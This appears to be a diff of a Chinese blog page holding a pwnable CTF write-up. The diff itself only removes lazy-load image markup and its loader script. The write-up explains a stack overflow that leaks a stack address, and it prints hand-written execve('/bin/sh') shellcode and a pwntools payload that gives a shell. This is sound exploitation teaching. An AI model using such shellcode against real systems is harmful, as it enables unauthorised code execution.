@@ -138,7 +138,7 @@
         <div class="left">
             
                 <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/img/loading.gif" data-original="/images/favicon.png" class="w-full h-full rounded-sm">
+                    <img src="/images/favicon.png" class="w-full h-full rounded-sm">
                 </a>
             
             <a class="logo-title" href="/">
@@ -256,7 +256,7 @@
         
             <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                 <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/img/loading.gif" data-original="/images/avatar.jpg">
+                    <img src="/images/avatar.jpg">
                 </div>
                 <div class="info flex flex-col justify-between">
                     <div class="author flex items-center">
@@ -328,11 +328,11 @@
 <ul>
 <li>直接看ida反汇编，发现看不懂：</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901105731101.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901105731101.bmp"></p>
 <ul>
 <li>果断选择看汇编：</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901105741003.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901105741003.bmp"></p>
 <p><font size="4"><strong>根据汇编我们可以知道这里执行了两个函数：</strong></font></p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x14</span>)</span><br><span class="line">read(<span class="number">3</span>,buf,<span class="number">0x3c</span>)</span><br></pre></td></tr></table></figure></div>
 
@@ -351,11 +351,11 @@
 <ul>
 <li><font size="4">此时栈溢出修改ret_address</font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901112556053.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901112556053.bmp"></p>
 <ul>
 <li><font size="4">泄露出栈地址：</font></li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901112801146.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901112801146.bmp"></p>
 <h4 id="2-手写shellcode"><a href="#2-手写shellcode" class="headerlink" title="2.手写shellcode"></a>2.手写shellcode</h4><ul>
 <li>我们可以写入0x3c的数据，除了0x14的垃圾数据和覆盖返回地址，还可以写入0x3c-0x18&#x3D;0x24的内容，用<strong>pwntools自动生成的shellcode长度是0x2c，发现是过长了的,所以我们要自己手写shellcode。</strong></li>
 <li><fron size="4" color="red">如何手写？</fron></li>
@@ -380,7 +380,7 @@
 
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901114138740.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/pwnable%E7%B3%BB%E5%88%97/capture_20240901114138740.bmp"></p>
 <ul>
 <li>ok,执行了execve(‘&#x2F;bin&#x2F;sh‘，0，0)了，就getshell了</li>
 </ul>
@@ -683,7 +683,7 @@
     </div>
 
     <div class="image-viewer-container">
-    /img/loading.gif" data-original="<img src="">
+    <img src="">
 </div>
 
 
@@ -810,18 +810,5 @@
 
 
 
-
-        <style>
-            [bg-lazy] {
-                background-image: none !important;
-                background-color: #eee !important;
-            }
-        </style>
-        <script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                preloadRatio: 1,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</body>
 </html>
